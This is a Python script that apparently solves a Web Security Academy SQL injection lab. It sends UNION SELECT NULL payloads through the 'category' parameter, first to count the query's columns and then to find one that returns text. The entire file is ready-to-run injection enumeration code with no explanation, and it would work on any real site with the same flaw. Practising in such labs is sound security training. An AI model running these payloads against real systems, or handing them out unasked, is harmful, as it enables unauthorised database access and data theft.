import requests

# Ask user for the lab URL
url = input("Enter the lab URL (e.g., https://0ad100f104e584a882fcba1e0080006d.web-security-academy.net/):  ")

# Ask for the random string provided by the lab
random_string = input("Enter the random string provided by the lab (e.g., 'xabc123'): ")

# Ensure it's wrapped in quotes
text_value = f"'{random_string}'"

# Determine number of columns via error-based feedback
columns_tested = 0
for i in range(1, 6):  # Test up to 5 columns
    payload = f"'+UNION+SELECT+" + ",".join(["NULL"] * i) + "--"
    params = {'category': payload}
    try:
        response = requests.get(url, params=params)
        if "Internal Server Error" not in response.text:
            columns_tested = i
            print(f"[+] Query returns {columns_tested} columns.")
            break
    except Exception as e:
        print(f"[!] Error: {e}")
        exit()

if columns_tested == 0:
    print("[-] Could not determine number of columns.")
    exit()

# Now test each column to find one that accepts text
found = False
for i in range(columns_tested):
    payload_list = ["NULL"] * columns_tested
    payload_list[i] = text_value
    payload = f"'+UNION+SELECT+{','.join(payload_list)}--"
    params = {'category': payload}
    response = requests.get(url, params=params)

    if random_string in response.text:
        print(f"[+] Column {i+1} accepts text data.")
        found = True
        break

if not found:
    print("[-] No column accepts text input.")
